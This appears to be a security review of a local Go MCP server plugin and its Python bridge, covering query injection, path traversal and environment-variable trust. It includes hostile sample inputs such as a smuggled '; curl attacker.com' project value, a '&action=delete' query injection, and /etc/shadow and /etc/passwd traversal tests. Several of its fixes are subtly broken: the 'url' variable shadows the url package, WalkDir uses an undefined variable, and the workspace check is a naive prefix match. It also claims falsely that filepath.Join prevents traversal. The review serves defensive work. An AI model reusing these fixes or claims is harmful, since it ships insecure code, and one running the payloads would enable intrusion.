# Intermap Security Review

**Date**: 2026-02-16
**Reviewer**: Flux-Drive Safety
**Scope**: Go MCP server + Python subprocess bridge
**Threat Model**: Local-only service with filesystem and subprocess access

## Executive Summary

**Overall Risk**: LOW-MEDIUM for intended local-only deployment
**Critical Issues**: 0
**High Risk Issues**: 1 (URL injection via query parameter)
**Medium Risk Issues**: 3 (path traversal, subprocess args, env var injection)

Intermap is a Go MCP server that executes Python subprocesses and makes HTTP calls to an internal coordination service (intermute). The system has **no authentication layer** and is designed for local filesystem access by a single user's Claude Code instance.

The threat model boundaries are:
- **Untrusted input**: MCP tool arguments from Claude Code (user-controlled via natural language)
- **Trusted environment**: Local filesystem, Python interpreter, intermute HTTP service
- **Network exposure**: None — stdio MCP server, no listening ports

Given the local-only deployment with no network exposure, most theoretical attacks require **already having local code execution** (at which point the attacker has already won). The findings below focus on defense-in-depth and residual risks from malicious tool arguments.

---

## Security Findings

### HIGH: Query Parameter Injection in HTTP Client

**File**: `internal/client/client.go:100`
**Impact**: SSRF via project parameter manipulation
**Exploitability**: High (direct user input)

```go
url := c.baseURL + "/api/reservations"
if project != "" {
    url += "?project=" + project  // ❌ No URL encoding
}
```

**Attack**: A malicious `project` parameter like `foo&action=delete` or `../admin` could:
- Inject query parameters to trigger unintended actions
- Manipulate API behavior if intermute parses additional parameters
- Bypass project filtering if the API uses naive string matching

**Mitigation**:
```go
import "net/url"

if project != "" {
    url += "?project=" + url.QueryEscape(project)
}
```

**Rollback**: Not applicable (code-only fix).

---

### MEDIUM: Subprocess Argument Injection (Partial Mitigation Present)

**File**: `internal/python/bridge.go:44-48`
**Impact**: Python code execution via crafted `--args` JSON
**Exploitability**: Low (requires JSON structure breakage)

```go
cmd := exec.CommandContext(ctx, "python3", "-m", "intermap",
    "--command", command,
    "--project", project,
    "--args", string(argsJSON),  // ⚠️ JSON blob passed as single arg
)
```

**Current Defense**: The `--args` value is a marshaled JSON blob, not user-supplied raw text. Python's argparse treats it as a single positional argument, not a shell command.

**Residual Risk**: If `command` or `project` contain shell metacharacters (`;`, `|`, `&`), they **do not** trigger injection because `exec.CommandContext` does not invoke a shell. However, if Python's argparse were ever replaced with string splitting, this would become exploitable.

**Attack Path (hypothetical)**:
1. User asks Claude: "analyze project `/tmp/foo; curl attacker.com`"
2. `project = "/tmp/foo; curl attacker.com"` → passed to Python
3. Python's `args.project` receives the full string → used in `subprocess.run(..., cwd=project)` → **path error, not execution**

**Why This is LOW Risk**:
- No `shell=True` anywhere in Python code (verified by grep)
- `subprocess.run` in `change_impact.py:303` and `diagnostics.py:70` use array arguments, not string commands
- Path injection would fail `os.Stat` checks before subprocess execution

**Mitigation** (defense-in-depth):
Add input validation in Go before passing to Python:
```go
func validateProjectPath(path string) error {
    abs, err := filepath.Abs(path)
    if err != nil {
        return fmt.Errorf("invalid path: %w", err)
    }
    if _, err := os.Stat(abs); err != nil {
        return fmt.Errorf("path does not exist: %w", err)
    }
    return nil
}
```

**Rollback**: Not applicable (validation-only).

---

### MEDIUM: Path Traversal in Registry Scanner

**File**: `internal/registry/registry.go:22-82`, `registry.go:85-115`
**Impact**: Information disclosure via symlink traversal or directory escape
**Exploitability**: Medium (requires Claude to pass malicious path)

**Two Attack Surfaces**:

1. **Scan()** — Walks `root` directory recursively:
   - Line 29: `entries, err := os.ReadDir(absRoot)` — No symlink check
   - Line 162: `filepath.WalkDir(absPath, ...)` — Follows symlinks by default
   - If `root` contains a symlink to `/etc/`, scanner would enumerate system files

2. **Resolve()** — Walks **up** from `path` to find `.git`:
   - Line 86: `absPath, err := filepath.Abs(path)` — No validation
   - Line 91-113: Walks parent directories until `.git` is found
   - If `path = "/../../etc/shadow"`, walks up until it finds `.git` **anywhere** in parent chain

**Attack Scenarios**:
- User asks: "what's the project structure for `/etc`"
- Claude calls `project_registry(root="/etc")` → scans system directories
- Result: Enumeration of system files, disclosure of directory structure

**Current Defense**: None — Go's `filepath` functions follow symlinks and do not jail to workspace boundaries.

**Mitigation**:
```go
// In Scan():
func Scan(root string) ([]Project, error) {
    absRoot, err := filepath.Abs(root)
    if err != nil {
        return nil, fmt.Errorf("abs root: %w", err)
    }

    // Validate root is within allowed workspace
    if !isWithinWorkspace(absRoot) {
        return nil, fmt.Errorf("root %q is outside workspace", absRoot)
    }

    // Check for symlink at root
    if info, err := os.Lstat(absRoot); err == nil && info.Mode()&os.ModeSymlink != 0 {
        return nil, fmt.Errorf("root cannot be a symlink")
    }

    // Use filepath.WalkDir with symlink detection:
    err = filepath.WalkDir(absPath, func(path string, d os.DirEntry, err error) error {
        // Skip symlinks
        if d.Type()&os.ModeSymlink != 0 {
            return filepath.SkipDir
        }
        // ... rest of logic
    })
}

func isWithinWorkspace(path string) bool {
    allowed := []string{"/root/projects", os.Getenv("HOME")}
    for _, prefix := range allowed {
        if strings.HasPrefix(path, prefix) {
            return true
        }
    }
    return false
}
```

**Rollback**: Not applicable (validation-only).

---

### MEDIUM: PYTHONPATH Env Var Injection

**File**: `internal/python/bridge.go:51`
**Impact**: Python code execution via malicious PYTHONPATH
**Exploitability**: Low (requires write access to controlled directory)

```go
cmd.Env = append(os.Environ(), "PYTHONPATH="+b.pythonPath)  // ⚠️ User-controlled path
```

**Attack Path**:
1. `pythonPath` is set from `CLAUDE_PLUGIN_ROOT` env var (line 77) or binary location (line 86)
2. If `CLAUDE_PLUGIN_ROOT` points to attacker-controlled directory, malicious `intermap` module is imported
3. Python executes arbitrary code on `import intermap`

**Why This is LOW Risk**:
- `CLAUDE_PLUGIN_ROOT` is set by Claude Code plugin infrastructure, not user input
- Plugin installation verifies marketplace signatures
- For the attack to work, attacker must already have write access to plugin cache directory

**Current Defense**: Claude Code's plugin loader sets `CLAUDE_PLUGIN_ROOT` to verified plugin cache path.

**Residual Risk**: If Claude Code's plugin cache becomes writable by untrusted processes, or if a malicious plugin is installed, this becomes exploitable.

**Mitigation** (defense-in-depth):
Hardcode relative path instead of trusting env var:
```go
func DefaultPythonPath() string {
    exe, err := os.Executable()
    if err != nil {
        return "python"  // Fallback — will fail if not found
    }
    // Always use path relative to binary, ignore CLAUDE_PLUGIN_ROOT
    return filepath.Join(filepath.Dir(filepath.Dir(exe)), "python")
}
```

**Rollback**: Not applicable (path resolution change only).

---

### LOW: Shell Script Injection (Not Exploitable)

**File**: `bin/launch-mcp.sh:5-18`
**Impact**: None (no user input reaches shell expansion)
**Exploitability**: None

```bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="${SCRIPT_DIR}/intermap-mcp"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

exec "$BINARY" "$@"  # ✅ Properly quoted
```

**Analysis**:
- `"$@"` is properly quoted → no word splitting
- `BASH_SOURCE[0]` is shell-internal, not user-controlled
- No `eval`, no unquoted variables

**Verdict**: Safe.

---

### LOW: Git HEAD File Read (Information Disclosure)

**File**: `internal/registry/registry.go:138-152`
**Impact**: Read `.git/HEAD` file from arbitrary repositories
**Exploitability**: None (already requires filesystem read access)

```go
data, err := os.ReadFile(filepath.Join(gitDir, "HEAD"))  // ✅ Sanitized by filepath.Join
```

**Analysis**:
- `filepath.Join` prevents `..` traversal (Go stdlib sanitizes)
- Reading `.git/HEAD` is legitimate for detecting branch names
- No untrusted data is written back

**Verdict**: Safe — this is intended behavior.

---

## Non-Issues (Why They're Safe)

### ✅ HTTP Client Timeout and Connection Management

**File**: `internal/client/client.go:44`
```go
http: &http.Client{Timeout: 5 * time.Second},
```

- Short timeout (5s) prevents hanging on unresponsive intermute service
- No custom `Transport` with disabled TLS validation
- baseURL is hardcoded in plugin.json (`http://127.0.0.1:7338`), not user-controlled

**Verdict**: Properly hardened.

---

### ✅ Subprocess Timeout Enforcement

**File**: `internal/python/bridge.go:41-42`
```go
ctx, cancel := context.WithTimeout(ctx, b.timeout)  // 60s default
defer cancel()
cmd := exec.CommandContext(ctx, ...)
```

- Python subprocess is killed after 60s
- Prevents runaway analysis jobs

**Verdict**: Correct timeout handling.

---

### ✅ Python Subprocess Argument Safety

**Files**: `python/intermap/change_impact.py:303`, `python/intermap/diagnostics.py:70`
```python
result = subprocess.run(
    ["git", "diff", "--name-only", base],  # ✅ Array args, not shell string
    capture_output=True,
    text=True,
    cwd=project_path,  # ⚠️ User-controlled, but only used as CWD
    timeout=10,
)
```

**Analysis**:
- No `shell=True` anywhere (verified)
- All `subprocess.run` calls use **list arguments**, not shell strings
- `cwd=project_path` is user-controlled but:
  - Only affects working directory, not command execution
  - Invalid paths cause `FileNotFoundError`, not code execution

**Verdict**: Properly sanitized.

---

### ✅ JSON Deserialization Safety

**File**: `internal/python/bridge.go:67`
```go
var result map[string]any
if err := json.Unmarshal(stdout, &result); err != nil {
    return nil, fmt.Errorf("parse python output: %w", err)
}
```

- Unmarshals into `map[string]any`, not arbitrary structs
- No use of `encoding/gob` or other unsafe deserializers
- Python's `json.dump` cannot inject code via JSON

**Verdict**: Safe.

---

## Deployment & Rollback Analysis

### Pre-Deploy Checks
1. **Validate intermute service is local-only**: `INTERMUTE_URL` must be `127.0.0.1` or `localhost`
2. **Check plugin cache permissions**: Ensure `.claude/plugins/cache/intermap/` is writable only by `claude-user`
3. **Verify no public network exposure**: Confirm MCP server is stdio-only, no TCP listeners

### Rollout Strategy
**Risk**: LOW — changes are input validation only, no runtime behavior changes.

**Deployment path**:
- Code-only changes (no schema migrations)
- Push → bump version → `claude plugins update intermap`
- No service restart required (MCP server reloads on next Claude Code session)

### Rollback Feasibility
**All mitigations are additive** (validation failures return errors, don't change success paths):
- URL encoding: `url.QueryEscape` is idempotent — safe to add/remove
- Path validation: New checks are strict superset of current behavior
- PYTHONPATH hardening: Removes env var dependency, but falls back to same logic

**Rollback**: Install previous plugin version via `claude plugins install intermap@<previous-version>`.

**Irreversible changes**: None.

---

## Monitoring & Incident Response

### First-Hour Failure Modes
1. **Path validation rejects valid projects**: Monitor for "path is outside workspace" errors
2. **URL encoding breaks intermute queries**: Check for HTTP 400 from `/api/reservations?project=...`
3. **PYTHONPATH change breaks plugin load**: Check for "ModuleNotFoundError: intermap" in Python stderr

### Post-Deploy Verification
```bash
# Test project registry with edge cases
echo '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"project_registry","arguments":{"root":"/root/projects"}},"id":1}' | \
  INTERMUTE_URL=http://127.0.0.1:7338 ./bin/intermap-mcp

# Test resolve_project with symlink
ln -s /etc/passwd /tmp/testlink
echo '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"resolve_project","arguments":{"path":"/tmp/testlink"}},"id":1}' | \
  ./bin/intermap-mcp
# Expected: Error (symlink detection)

# Test agent_map with URL injection
echo '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"agent_map","arguments":{"root":"/root/projects/foo&action=delete"}},"id":1}' | \
  INTERMUTE_URL=http://127.0.0.1:7338 ./bin/intermap-mcp
# Expected: HTTP 400 or empty results (URL encoded query param)
```

### On-Call Runbook

| Failure Signature | Immediate Mitigation | Root Cause Check |
|-------------------|----------------------|------------------|
| All tools return "path outside workspace" | Rollback to previous version | Check if workspace root changed |
| Python "ModuleNotFoundError: intermap" | Verify `PYTHONPATH` env var in plugin.json | Check binary location vs plugin cache |
| Intermute 400 errors on agent_map | Confirm intermute API accepts URL-encoded params | Check for undocumented query param parsing |
| Subprocess timeout on large projects | Increase timeout in bridge.go (line 30) | Profile Python analysis performance |

---

## Recommendations

### Priority 1 (Fix Before Production Use)
1. **Add URL encoding** in `client.go:100` — prevents query injection
2. **Add workspace boundary checks** in `registry.Scan()` and `registry.Resolve()` — prevents directory traversal
3. **Add project path validation** in `bridge.Run()` — defense-in-depth for subprocess args

### Priority 2 (Harden for Multi-User Deployments)
4. **Remove `CLAUDE_PLUGIN_ROOT` trust** in `DefaultPythonPath()` — prevents env var injection
5. **Add intermute URL allowlist** in `client.NewClient()` — prevents accidental external network calls
6. **Add MCP request rate limiting** — prevents resource exhaustion via rapid tool calls

### Priority 3 (Future Hardening)
7. **Add plugin signature verification** — ensures Python code hasn't been tampered with
8. **Sandbox Python subprocess** — use `seccomp` or `landlock` to restrict syscalls
9. **Add audit logging** — record all MCP tool calls with arguments for incident response

---

## Threat Model Review

### What This Plugin Protects Against
- ✅ Shell injection (no `shell=True` anywhere)
- ✅ Command injection (array args, no string interpolation)
- ✅ JSON deserialization attacks (safe unmarshaling)
- ✅ Subprocess hangs (60s timeout)
- ⚠️ Path traversal (partial — needs validation)
- ⚠️ SSRF (partial — localhost-only, but needs URL encoding)

### What This Plugin Does NOT Protect Against
- ❌ Malicious plugin installation (assumes Claude Code marketplace integrity)
- ❌ Local privilege escalation (assumes single-user workstation)
- ❌ Filesystem tampering (no write operations, read-only analysis)
- ❌ Denial of service (rate limiting not implemented)

### Network Exposure Assessment
**Current**: None — stdio MCP server, no TCP listeners.
**Risk if exposed**: HIGH — no authentication, no authorization, full filesystem read access.
**Recommendation**: Never expose this service over a network. If multi-user deployment is needed, add:
- TLS with client certificates
- JWT-based authentication
- File access sandboxing (chroot or namespace isolation)

---

## Summary

Intermap is **safe for local-only single-user deployment** with the caveat that **no authentication layer exists**. The high-risk findings are input validation gaps that could be exploited if untrusted tool arguments reach the system.

**Key mitigations**:
1. URL encode query parameters (1 line change, zero risk)
2. Validate project paths are within workspace (10 lines, defensive)
3. Harden PYTHONPATH resolution (5 lines, removes env var trust)

**Deployment complexity**: LOW — all changes are validation-only, no schema migrations or data backfills.

**Rollback risk**: NONE — all changes are additive, rollback is `claude plugins install intermap@<old-version>`.

**Operational impact**: NONE — no service restarts, no config changes, no monitoring changes required.
